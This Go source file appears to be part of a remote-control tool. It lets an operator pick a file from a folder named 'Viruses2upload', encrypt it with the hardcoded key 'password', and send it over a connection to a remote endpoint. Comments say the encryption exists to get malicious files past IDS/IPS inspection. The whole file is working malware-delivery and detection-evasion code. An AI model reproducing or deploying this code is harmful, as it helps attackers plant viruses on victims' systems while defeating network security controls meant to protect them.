package core

import (
	"encoding/gob"
	"fmt"
	"path/filepath"
	"strconv"
)

type FileStruct struct {
	FileName           string
	FileSize           int
	FileContent        []byte
	EncryptionKey	   []byte
}

func (srv *Server)SelectFile2upload(){
	list_files,err := IOReadDir("./Viruses2upload") // every file to upload must be present in this folder
	DisplayError(err)
	for i, file := range list_files{
		fmt.Println("[",i,"]"," ",file)		// select files based on index displayed
	}
	fmt.Println()
	fmt.Println("Select file number")		// select file based on index, writing name for each file is difficult
	fileNum,err := GetUserInput()				// get file index you want to upload
	fileIndex, err := strconv.Atoi(fileNum)		// convert string index to int

	selectedFile := list_files[fileIndex]		// select file based on index.

	selectedFile = "Viruses2upload/"+selectedFile
	fmt.Println("selected file: ", selectedFile)
	DisplayError(err)

	srv.UploadFile(selectedFile)
}

func (s *Server) UploadFile(fileName string){
	data, err := s.ReadFileContent(fileName)   // read file content in bytes slices
	DisplayError(err)
	fs := &FileStruct{}				// empty struct to be used to sending serialized bytes

	key := "password"				// key to be used for encrypting data, IDS/IPS prevents sending viruses if they c
	//	contain malicious bytes, so we encrypt the bytes to bypass
	fs.EncryptionKey = []byte(key)

	encryptedData := Encrypt(data, key)   // Encrypt return encrypted bytes based on given key
	actualName := filepath.Base(fileName)	// fileName = Viruses2upload/somefile.exe, i am interested in somefile.exe

	fs.FileName = actualName
	fs.FileContent = encryptedData			// put data in struct to send

	encoder := gob.NewEncoder(s.Conn)
	err = encoder.Encode(fs)			//sending data
	DisplayError(err)
	fmt.Println("[+] File Sent successfully")
}